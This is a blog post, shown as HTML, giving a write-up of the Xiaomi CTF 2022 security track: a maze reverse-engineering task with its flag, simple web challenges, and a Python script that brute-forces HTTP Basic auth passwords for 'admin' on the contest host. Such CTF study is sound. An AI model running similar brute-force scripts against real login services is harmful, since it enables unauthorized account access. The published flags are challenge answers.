@@ -1,0 +1,1008 @@
+<!doctype html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Rspress v1.15.0"><title data-rh="true">小米CTF2022安全赛道writeup - SumyBlog</title><meta data-rh="true" name="description" content="SumyGG&#x27;s Blog"/><meta data-rh="true" name="referrer" content="no-referrer-when-downgrade"/><link data-rh="true" rel="alternate" type="application/rss+xml" href="https://sumygg.com/rss/feed.rss"/>
+<script id="check-dark-light">
+;(() => {
+  const saved = localStorage.getItem('rspress-theme-appearance')
+  const prefereDark = window.matchMedia('(prefers-color-scheme: dark)').matches
+  if (!saved || saved === 'auto' ? prefereDark : saved === 'dark') {
+    document.documentElement.classList.add('dark')
+  }
+})()
+</script>
+<title>SumyBlog</title><link rel="icon" href="/favicon.ico"><script defer="defer" src="/static/js/styles.df47b71a.js"></script><script defer="defer" src="/static/js/lib-lodash.b329996d.js"></script><script defer="defer" src="/static/js/lib-polyfill.6c0e3b15.js"></script><script defer="defer" src="/static/js/lib-react.1a4d633b.js"></script><script defer="defer" src="/static/js/lib-router.345150bc.js"></script><script defer="defer" src="/static/js/4051.e82f0025.js"></script><script defer="defer" src="/static/js/index.e31e71f4.js"></script><link href="/static/css/styles.fb4df59b.css" rel="stylesheet"><script async src="https://www.googletagmanager.com/gtag/js?id=G-2NDCXW15G4"></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-2NDCXW15G4")</script><link href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css" rel="stylesheet" integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV" crossorigin="anonymous"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" crossorigin="anonymous"></script></head><body ><div id="root"><div><div><div class="navContainer_f6cde sticky rspress-nav px-6 "><div class="container_f6cde flex justify-between items-center h-full"><div class="navBarTitle_f6cde"><a href="/" class="flex items-center w-full h-full text-base font-semibold transition-opacity duration-300 hover:opacity-60"><span>SumyBlog</span></a></div><div class="undefined flex flex-1 justify-end items-center"><div class="rightNav_f6cde"><div class="flex sm:flex-1 items-center sm:pl-4 sm:pr-2"><div class="rspress-nav-search-button navSearchButton_6e282"><button><svg width="18" height="18" viewBox="0 0 32 32"><path fill="var(--rp-c-gray)" d="m29 27.586-7.552-7.552a11.018 11.018 0 1 0-1.414 1.414L27.586 29ZM4 13a9 9 0 1 1 9 9 9.01 9.01 0 0 1-9-9Z"></path></svg><p class="searchWord_6e282">搜索...</p><div style="opacity:0"><span></span><span>K</span></div></button></div><div class="mobileNavSearchButton_6e282"><svg width="24" height="24" viewBox="0 0 32 32"><path fill="var(--rp-c-gray)" d="m29 27.586-7.552-7.552a11.018 11.018 0 1 0-1.414 1.414L27.586 29ZM4 13a9 9 0 1 1 9 9 9.01 9.01 0 0 1-9-9Z"></path></svg></div></div><div class="rspress-nav-menu menu h-14"><a class="link_03735  cursor-pointer" target="" href="/blog/flinks/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">友情链接</div></a><a class="link_03735  cursor-pointer" target="" href="/blog/archives/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">归档</div></a><a class="link_03735  cursor-pointer" target="" href="/blog/categories/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">分类</div></a><a class="link_03735  cursor-pointer" target="" href="/blog/tags/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">标签</div></a><a class="link_03735  cursor-pointer" target="" href="/about/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">关于我</div></a></div><div class="flex-center flex-row"><div class="mx-2"><div class="md:mr-2 rspress-nav-appearance"><div class="p-1 border border-solid border-gray-300 text-gray-400  cursor-pointer rounded-md hover:border-gray-600 hover:text-gray-600 dark:hover:border-gray-200 dark:hover:text-gray-200 transition-all duration-300"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 18c-3.3 0-6-2.7-6-6s2.7-6 6-6 6 2.7 6 6-2.7 6-6 6zm0-10c-2.2 0-4 1.8-4 4s1.8 4 4 4 4-1.8 4-4-1.8-4-4-4zM12 4c-.6 0-1-.4-1-1V1c0-.6.4-1 1-1s1 .4 1 1v2c0 .6-.4 1-1 1zM12 24c-.6 0-1-.4-1-1v-2c0-.6.4-1 1-1s1 .4 1 1v2c0 .6-.4 1-1 1zM5.6 6.6c-.3 0-.5-.1-.7-.3L3.5 4.9c-.4-.4-.4-1 0-1.4s1-.4 1.4 0l1.4 1.4c.4.4.4 1 0 1.4-.1.2-.4.3-.7.3zM19.8 20.8c-.3 0-.5-.1-.7-.3l-1.4-1.4c-.4-.4-.4-1 0-1.4s1-.4 1.4 0l1.4 1.4c.4.4.4 1 0 1.4-.2.2-.5.3-.7.3zM3 13H1c-.6 0-1-.4-1-1s.4-1 1-1h2c.6 0 1 .4 1 1s-.4 1-1 1zM23 13h-2c-.6 0-1-.4-1-1s.4-1 1-1h2c.6 0 1 .4 1 1s-.4 1-1 1zM4.2 20.8c-.3 0-.5-.1-.7-.3-.4-.4-.4-1 0-1.4l1.4-1.4c.4-.4 1-.4 1.4 0s.4 1 0 1.4l-1.4 1.4c-.2.2-.4.3-.7.3zM18.4 6.6c-.3 0-.5-.1-.7-.3-.4-.4-.4-1 0-1.4l1.4-1.4c.4-.4 1-.4 1.4 0s.4 1 0 1.4l-1.4 1.4c-.2.2-.5.3-.7.3z"></path></svg></div></div></div><div class="social-links menu-item_93d67 flex-center relative"><div class="flex-center h-full gap-x-4 transition-colors duration-300 md:mr-2"><a href="https://github.com/sumy7/" target="_blank" rel="noopener noreferrer" class="social-links"><div class="social-links-icon_93d67"><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></div></a><a href="https://weibo.com/sumy7" target="_blank" rel="noopener noreferrer" class="social-links"><div class="social-links-icon_93d67"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" class="iconify iconify--ri" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><path fill="currentColor" d="M17.525 11.378c1.263.392 2.669 1.336 2.669 3.004c0 2.763-3.98 6.239-9.964 6.239c-4.565 0-9.23-2.213-9.23-5.852c0-1.902 1.204-4.102 3.277-6.177c2.773-2.77 6.004-4.033 7.219-2.816c.537.537.588 1.464.244 2.572c-.178.557.525.25.525.25c2.24-.938 4.196-.994 4.909.027c.38.543.343 1.306-.008 2.19c-.163.407.048.471.36.563zm-7.282 7.939c3.641-.362 6.401-2.592 6.167-4.983c-.237-2.391-3.382-4.038-7.023-3.677c-3.64.36-6.403 2.59-6.167 4.98c.237 2.394 3.382 4.039 7.023 3.68zM6.16 14.438c.754-1.527 2.712-2.39 4.446-1.94c1.793.463 2.707 2.154 1.976 3.8c-.744 1.682-2.882 2.578-4.695 1.993c-1.752-.566-2.493-2.294-1.727-3.853zm1.446 2.587c.568.257 1.325.013 1.676-.55c.346-.568.163-1.217-.407-1.459c-.563-.237-1.291.008-1.64.553c-.354.547-.189 1.202.371 1.456zm2.206-1.808c.219.092.501-.012.628-.231c.123-.22.044-.466-.178-.548c-.216-.084-.486.018-.613.232c-.123.214-.054.458.163.547zM19.873 9.5a.725.725 0 1 1-1.378-.451a1.38 1.38 0 0 0-.288-1.357a1.395 1.395 0 0 0-1.321-.425a.723.723 0 1 1-.303-1.416a2.836 2.836 0 0 1 3.29 3.649zm-3.916-6.575A5.831 5.831 0 0 1 21.5 4.72a5.836 5.836 0 0 1 1.22 5.704a.838.838 0 0 1-1.06.54a.844.844 0 0 1-.542-1.062a4.143 4.143 0 0 0-4.807-5.327a.845.845 0 0 1-.354-1.65z"></path></svg></div></a><a href="https://twitter.com/sumygg" target="_blank" rel="noopener noreferrer" class="social-links"><div class="social-links-icon_93d67"><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"></path></svg></div></a></div><div class="md:ml-1 p-2"><svg width="1em" height="1em" viewBox="0 0 32 32"><path fill="currentColor" d="M16 22 6 12l1.4-1.4 8.6 8.6 8.6-8.6L26 12z"></path></svg></div></div></div></div><div class="mobileNavMenu_f6cde"><div class="navScreen_457e8 " id="navScreen"><div class="container_457e8"><div class="navMenu_457e8"><div class="navMenuItem_457e8 w-full"><a class="link_03735  cursor-pointer" target="" href="/blog/flinks/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">友情链接</div></a></div><div class="navMenuItem_457e8 w-full"><a class="link_03735  cursor-pointer" target="" href="/blog/archives/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">归档</div></a></div><div class="navMenuItem_457e8 w-full"><a class="link_03735  cursor-pointer" target="" href="/blog/categories/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">分类</div></a></div><div class="navMenuItem_457e8 w-full"><a class="link_03735  cursor-pointer" target="" href="/blog/tags/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">标签</div></a></div><div class="navMenuItem_457e8 w-full"><a class="link_03735  cursor-pointer" target="" href="/about/index.html"><div class="rspress-nav-menu-item singleItem_f6cde  text-sm font-medium mx-1.5 px-3 py-2 flex items-center">关于我</div></a></div></div><div class="flex-center flex-col gap-2"><div class="mt-2 navAppearance_457e8 flex justify-center"></div><div class="social-links menu-item_93d67 flex-center relative"><div class="flex-center h-full gap-x-4 transition-colors duration-300 md:mr-2"><a href="https://github.com/sumy7/" target="_blank" rel="noopener noreferrer" class="social-links"><div class="social-links-icon_93d67"><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></div></a><a href="https://weibo.com/sumy7" target="_blank" rel="noopener noreferrer" class="social-links"><div class="social-links-icon_93d67"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" class="iconify iconify--ri" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><path fill="currentColor" d="M17.525 11.378c1.263.392 2.669 1.336 2.669 3.004c0 2.763-3.98 6.239-9.964 6.239c-4.565 0-9.23-2.213-9.23-5.852c0-1.902 1.204-4.102 3.277-6.177c2.773-2.77 6.004-4.033 7.219-2.816c.537.537.588 1.464.244 2.572c-.178.557.525.25.525.25c2.24-.938 4.196-.994 4.909.027c.38.543.343 1.306-.008 2.19c-.163.407.048.471.36.563zm-7.282 7.939c3.641-.362 6.401-2.592 6.167-4.983c-.237-2.391-3.382-4.038-7.023-3.677c-3.64.36-6.403 2.59-6.167 4.98c.237 2.394 3.382 4.039 7.023 3.68zM6.16 14.438c.754-1.527 2.712-2.39 4.446-1.94c1.793.463 2.707 2.154 1.976 3.8c-.744 1.682-2.882 2.578-4.695 1.993c-1.752-.566-2.493-2.294-1.727-3.853zm1.446 2.587c.568.257 1.325.013 1.676-.55c.346-.568.163-1.217-.407-1.459c-.563-.237-1.291.008-1.64.553c-.354.547-.189 1.202.371 1.456zm2.206-1.808c.219.092.501-.012.628-.231c.123-.22.044-.466-.178-.548c-.216-.084-.486.018-.613.232c-.123.214-.054.458.163.547zM19.873 9.5a.725.725 0 1 1-1.378-.451a1.38 1.38 0 0 0-.288-1.357a1.395 1.395 0 0 0-1.321-.425a.723.723 0 1 1-.303-1.416a2.836 2.836 0 0 1 3.29 3.649zm-3.916-6.575A5.831 5.831 0 0 1 21.5 4.72a5.836 5.836 0 0 1 1.22 5.704a.838.838 0 0 1-1.06.54a.844.844 0 0 1-.542-1.062a4.143 4.143 0 0 0-4.807-5.327a.845.845 0 0 1-.354-1.65z"></path></svg></div></a><a href="https://twitter.com/sumygg" target="_blank" rel="noopener noreferrer" class="social-links"><div class="social-links-icon_93d67"><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"></path></svg></div></a></div><div class="md:ml-1 p-2"><svg width="1em" height="1em" viewBox="0 0 32 32"><path fill="currentColor" d="M16 22 6 12l1.4-1.4 8.6 8.6 8.6-8.6L26 12z"></path></svg></div></div></div></div></div><button aria-label="mobile hamburger" class=" navHamburger_e7b06 text-gray-500"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32" fill="currentColor"><circle cx="8" cy="16" r="2" fill="currentColor"></circle><circle cx="16" cy="16" r="2" fill="currentColor"></circle><circle cx="24" cy="16" r="2" fill="currentColor"></circle></svg></button></div></div></div></div><section><div class="docLayout_edeb4 pt-0"><div class="content_edeb4 rspress-doc-container flex flex-shrink-0 mx-auto"><div class="w-full flex-1"><div><div class="rspress-doc"><!--$--><h1 id="小米ctf2022安全赛道writeup" class="text-3xl mb-10 leading-10 tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#小米ctf2022安全赛道writeup">#</a>小米CTF2022安全赛道writeup</h1><div class="postInfoContainer_07bfd -mt-5 mb-8"><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M3.5 0a.5.5 0 0 1 .5.5V1h8V.5a.5.5 0 0 1 1 0V1h1a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V5h16V4H0V3a2 2 0 0 1 2-2h1V.5a.5.5 0 0 1 .5-.5z\&quot;/&gt;&quot;}" inline="true"></iconify-icon> <!-- -->2022-06-24</span><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M9.828 3h3.982a2 2 0 0 1 1.992 2.181l-.637 7A2 2 0 0 1 13.174 14H2.825a2 2 0 0 1-1.991-1.819l-.637-7a1.99 1.99 0 0 1 .342-1.31L.5 3a2 2 0 0 1 2-2h3.672a2 2 0 0 1 1.414.586l.828.828A2 2 0 0 0 9.828 3zm-8.322.12C1.72 3.042 1.95 3 2.19 3h5.396l-.707-.707A1 1 0 0 0 6.172 2H2.5a1 1 0 0 0-1 .981l.006.139z\&quot;/&gt;&quot;}" inline="true"></iconify-icon> <a class="link_03735  cursor-pointer" target="" href="/blog/categories/index.html?category=读书笔记">读书笔记</a></span><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M2 1a1 1 0 0 0-1 1v4.586a1 1 0 0 0 .293.707l7 7a1 1 0 0 0 1.414 0l4.586-4.586a1 1 0 0 0 0-1.414l-7-7A1 1 0 0 0 6.586 1H2zm4 3.5a1.5 1.5 0 1 1-3 0a1.5 1.5 0 0 1 3 0z\&quot;/&gt;&quot;}" inline="true"></iconify-icon> <a class="link_03735  cursor-pointer" target="" href="/blog/tags/index.html?tag=CTF">CTF</a></span><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M2 1a1 1 0 0 0-1 1v4.586a1 1 0 0 0 .293.707l7 7a1 1 0 0 0 1.414 0l4.586-4.586a1 1 0 0 0 0-1.414l-7-7A1 1 0 0 0 6.586 1H2zm4 3.5a1.5 1.5 0 1 1-3 0a1.5 1.5 0 0 1 3 0z\&quot;/&gt;&quot;}" inline="true"></iconify-icon> <a class="link_03735  cursor-pointer" target="" href="/blog/tags/index.html?tag=writeup">writeup</a></span><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M2 1a1 1 0 0 0-1 1v4.586a1 1 0 0 0 .293.707l7 7a1 1 0 0 0 1.414 0l4.586-4.586a1 1 0 0 0 0-1.414l-7-7A1 1 0 0 0 6.586 1H2zm4 3.5a1.5 1.5 0 1 1-3 0a1.5 1.5 0 0 1 3 0z\&quot;/&gt;&quot;}" inline="true"></iconify-icon> <a class="link_03735  cursor-pointer" target="" href="/blog/tags/index.html?tag=小米CTF">小米CTF</a></span><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M9.293 0H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V4.707A1 1 0 0 0 13.707 4L10 .293A1 1 0 0 0 9.293 0zM9.5 3.5v-2l3 3h-2a1 1 0 0 1-1-1zM5.485 6.879l1.036 4.144l.997-3.655a.5.5 0 0 1 .964 0l.997 3.655l1.036-4.144a.5.5 0 0 1 .97.242l-1.5 6a.5.5 0 0 1-.967.01L8 9.402l-1.018 3.73a.5.5 0 0 1-.967-.01l-1.5-6a.5.5 0 1 1 .97-.242z\&quot;/&gt;&quot;}" inline="true"></iconify-icon> <!-- -->2.8k<!-- --> 字</span><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 3.5a.5.5 0 0 0-1 0V9a.5.5 0 0 0 .252.434l3.5 2a.5.5 0 0 0 .496-.868L8 8.71V3.5z\&quot;/&gt;&quot;}" inline="true"></iconify-icon> <!-- -->9<!-- --> 分钟</span><span class="postInfoMetaItem_07bfd"><iconify-icon icon="{&quot;body&quot;:&quot;&lt;g fill=\&quot;currentColor\&quot;&gt;&lt;path d=\&quot;M10.5 8a2.5 2.5 0 1 1-5 0a2.5 2.5 0 0 1 5 0z\&quot;/&gt;&lt;path d=\&quot;M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7a3.5 3.5 0 0 0 0 7z\&quot;/&gt;&lt;/g&gt;&quot;}" inline="true"></iconify-icon> </span></div>
+<blockquote class="border-l-2 border-solid border-divider pl-4 my-6 transition-colors duration-500 blockquote_3b154">
+<p class="my-4 leading-7">参加了下CTF比赛，最终获得了第五名的成绩。奖品是个电烤箱，很喜欢的一个奖品因为冬天烤🍠真的好棒。
+做CTF基本上就是边学边做，这篇文章主要记录下过了的CTF题目，以及一些解题思路。</p>
+</blockquote>
+<h2 id="re-1-maze" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#re-1-maze">#</a>re-1 maze</h2>
+<p class="my-4 leading-7">使用IDA pro反编译伪代码</p>
+<p class="my-4 leading-7"><img alt="反编译结果" src="/static/image/re-1-1.87e14cf1.png"/></p>
+<p class="my-4 leading-7">大概逻辑是，输入1234组成的20位字符串。根据题目描述——迷宫，可以将v5和v6理解为横坐标和纵坐标，1234表示下上右左。需要从左上走到右下。
+迷宫的地图在box中定义，1是不可通过，2是可以通过。</p>
+<p class="my-4 leading-7"><img alt="地图数据" src="/static/image/re-1-2.d8abe272.png"/></p>
+<p class="my-4 leading-7">转换成地图（手绘了一下，大概看一下）</p>
+<p class="my-4 leading-7"><img alt="手绘地图" src="/static/image/re-1-3.1b956e50.png"/></p>
+<p class="my-4 leading-7">按照步骤行走，最终得到flag</p>
+<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>flag{13113111332232331111}</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<h2 id="web-1-签到题" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-1-签到题">#</a>web-1 签到题</h2>
+<p class="my-4 leading-7">签到题</p>
+<p class="my-4 leading-7">打开控制台找到注释里的flag</p>
+<p class="my-4 leading-7"><img alt="在html注释里" src="/static/image/web-1-1.658db9ba.png"/></p>
+<h2 id="web-2-你会抓包吗" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-2-你会抓包吗">#</a>web-2 你会抓包吗</h2>
+<p class="my-4 leading-7">请求响应头里找到flag</p>
+<p class="my-4 leading-7"><img alt="这次在请求头里" src="/static/image/web-2-1.45cef1e3.png"/></p>
+<h2 id="web-3-爆破弱口令" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-3-爆破弱口令">#</a>web-3 爆破弱口令</h2>
+<p class="my-4 leading-7">6位密码很慢，花1积分买个hint，难度立即降低。</p>
+<p class="my-4 leading-7">爆破代码</p>
+<div class="language-python"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-python" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>import requests
+</span></span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">url = &quot;https://httpbasic-ctfd.dun.mi.com/&quot;
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">payload = {}
+</span><span style="display:block;padding:0 1.25rem">headers = {
+</span><span style="display:block;padding:0 1.25rem">    &#x27;authority&#x27;: &#x27;httpbasic-ctfd.dun.mi.com&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;accept-language&#x27;: &#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    # &#x27;authorization&#x27;: &#x27;Basic YWRtaW46OTg3NjU0&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;cache-control&#x27;: &#x27;max-age=0&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;cookie&#x27;: &#x27;xx&#x27;, # TODO 赋值cookie
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-ch-ua&#x27;: &#x27;&quot;Chromium&quot;;v=&quot;104&quot;, &quot;/Not)A;Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;104&quot;&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-ch-ua-mobile&#x27;: &#x27;?0&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-ch-ua-platform&#x27;: &#x27;&quot;macOS&quot;&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-fetch-dest&#x27;: &#x27;document&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-fetch-mode&#x27;: &#x27;navigate&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-fetch-site&#x27;: &#x27;none&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;sec-fetch-user&#x27;: &#x27;?1&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;upgrade-insecure-requests&#x27;: &#x27;1&#x27;,
+</span><span style="display:block;padding:0 1.25rem">    &#x27;user-agent&#x27;: &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;
+</span><span style="display:block;padding:0 1.25rem">}
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">username = &#x27;admin&#x27;
+</span><span style="display:block;padding:0 1.25rem">for passwd in range(300, 999):
+</span><span style="display:block;padding:0 1.25rem">    passwd_str = &quot;{0:06d}&quot;.format(passwd * 1000 + 672)
+</span><span style="display:block;padding:0 1.25rem">    response = requests.request(&quot;GET&quot;, url, headers=headers, data=payload, auth=(username, passwd_str))
+</span><span style="display:block;padding:0 1.25rem">
+</span><span style="display:block;padding:0 1.25rem">    print(passwd_str, response.status_code)
+</span><span style="display:block;padding:0 1.25rem">    print(response.text)
+</span><span style="display:block;padding:0 1.25rem">    if response.status_code != 401:
+</span><span style="display:block;padding:0 1.25rem">        break</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
+<h2 id="web-4-手速要快" class="mt-14 mb-6 text-2xl tracking-tight title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-4-手速要快">#</a>web-4 手速要快</h2>
+<p class="my-4 leading-7">网页会自动跳转，使用postman请求，在源码中看到flag。控制台保留日志跳转也可以。</p>
